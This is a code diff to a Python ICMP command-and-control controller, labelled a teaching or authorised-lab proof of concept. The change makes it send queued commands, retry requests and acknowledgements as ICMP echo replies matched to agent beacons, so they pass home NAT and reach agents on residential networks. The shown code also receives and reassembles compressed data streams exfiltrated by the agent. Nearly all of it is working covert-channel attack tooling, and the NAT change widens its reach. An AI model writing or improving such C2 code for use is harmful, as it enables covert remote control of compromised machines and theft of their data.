@@ -4,7 +4,11 @@ controller.py — ICMP C2 controller (teaching / authorised-lab PoC).
 
 Listens for agent CMD!BEACON|<id>, learns src IP (unless --lock-target),
 queues menu tasks, dispatches on next beacon. zlib-chunked streams over
-ICMP type 8 (START/CHUNK/END), RETRY/ACK, busy lock.
+ICMP (START/CHUNK/END), RETRY/ACK, busy lock.
+
+NAT note: commands/ACK/RETRY are sent as ICMP echo *replies* (type 0)
+matching the agent's request id/seq so home NAT conntrack can deliver them.
+New type-8 requests to a residential public IP are usually dropped.
 """
 
 from __future__ import annotations
@@ -59,7 +63,18 @@ def shutdown_sequence() -> None:
     os._exit(0)
 
 
+def send_icmp_reply(dst: str, icmp_id: int, icmp_seq: int, cmd_string: str) -> None:
+    """Send CMD! as ICMP echo reply (type 0) matching request id/seq — NAT-friendly."""
+    pkt = (
+        IP(dst=dst)
+        / ICMP(type=0, id=icmp_id, seq=icmp_seq)
+        / Raw(load=TRIGGER_MARKER + cmd_string.encode())
+    )
+    send(pkt, iface=IFACE, verbose=False)
+
+
 def send_trigger(cmd_string: str) -> None:
+    """Fallback: new type-8 request (no live request to reply to). Prefer send_icmp_reply."""
     if not TARGET_IP:
         print("[-] No agent IP yet — wait for a BEACON.")
         return
@@ -85,31 +100,35 @@ def packet_handler(packet) -> None:
     idx = raw_load.find(TRIGGER_MARKER)
     data = raw_load[idx + len(TRIGGER_MARKER) :]
 
-    # Agent beacon: learn src IP, dispatch queued task
+    icmp_id = int(packet[ICMP].id) if packet.haslayer(ICMP) else 0xC200
+    icmp_seq = int(packet[ICMP].seq) if packet.haslayer(ICMP) else 0
+    src = packet[IP].src
+
+    # Agent beacon: learn src IP, dispatch queued task as type-0 reply (NAT)
     if data.startswith(b"BEACON|"):
-        src = packet[IP].src
         agent_id = data[7:].decode("utf-8", errors="ignore")
         last_agent_id = agent_id
         if LOCK_TARGET and TARGET_IP and src != TARGET_IP:
             return
         if not LOCK_TARGET and src != TARGET_IP:
+            # Only announce IP changes — quiet on routine beacons
             print(f"\n[+] Beacon from {src} id={agent_id}"
                   + (f" (was {TARGET_IP})" if TARGET_IP else ""))
             TARGET_IP = src
-        else:
-            sys.stdout.write("*")
-            sys.stdout.flush()
         with stream_lock:
             cmd = pending_cmd
             busy = stream_busy
         if cmd and not busy and TARGET_IP:
-            send_trigger(cmd)
             with stream_lock:
                 pending_cmd = None
-            print(f"\n[+] Dispatched on beacon: {cmd}")
+            # send() from inside sniff prn can fail/reenter — dispatch off-thread
+            def _dispatch(c=cmd, d=src, iid=icmp_id, iseq=icmp_seq):
+                send_icmp_reply(d, iid, iseq, c)
+                print(f"\n[+] Dispatched on beacon (echo-reply): {c}")
+            threading.Thread(target=_dispatch, daemon=True).start()
         return
 
-    if not TARGET_IP or packet[IP].src != TARGET_IP:
+    if not TARGET_IP or src != TARGET_IP:
         return
 
     if data.startswith(b"[START]"):
@@ -152,7 +171,10 @@ def packet_handler(packet) -> None:
         if missing:
             retry_string = ",".join(str(i) for i in missing)
             print(f"\n[!] Missing frames {retry_string}; requesting RETRY")
-            send_trigger(f"RETRY|{retry_string}")
+            # Reply to END packet so NAT delivers RETRY
+            def _retry(d=src, iid=icmp_id, iseq=icmp_seq, rs=retry_string):
+                send_icmp_reply(d, iid, iseq, f"RETRY|{rs}")
+            threading.Thread(target=_retry, daemon=True).start()
             return
 
         print("\n[+] Stream complete; decompressing...")
@@ -166,7 +188,10 @@ def packet_handler(packet) -> None:
                 with open(out_name, "wb") as f:
                     f.write(original)
                 print(f"\n[+] Wrote '{out_name}' ({len(original)} bytes)")
-            send_trigger("ACK|DONE")
+
+            def _ack(d=src, iid=icmp_id, iseq=icmp_seq):
+                send_icmp_reply(d, iid, iseq, "ACK|DONE")
+            threading.Thread(target=_ack, daemon=True).start()
         except Exception as e:
             print(f"[-] Decompress failed: {e}")
         finally:
@@ -227,6 +252,7 @@ def main() -> None:
     tgt = TARGET_IP or "(waiting for BEACON)"
     print(f"[+] Sniffing ICMP on {IFACE}; target {tgt}"
           + (" [locked]" if LOCK_TARGET else " [dynamic from beacon]"))
+    print("[*] Dispatch/ACK/RETRY use ICMP echo-reply (type 0) for NAT traversal.")
 
     while True:
         try:
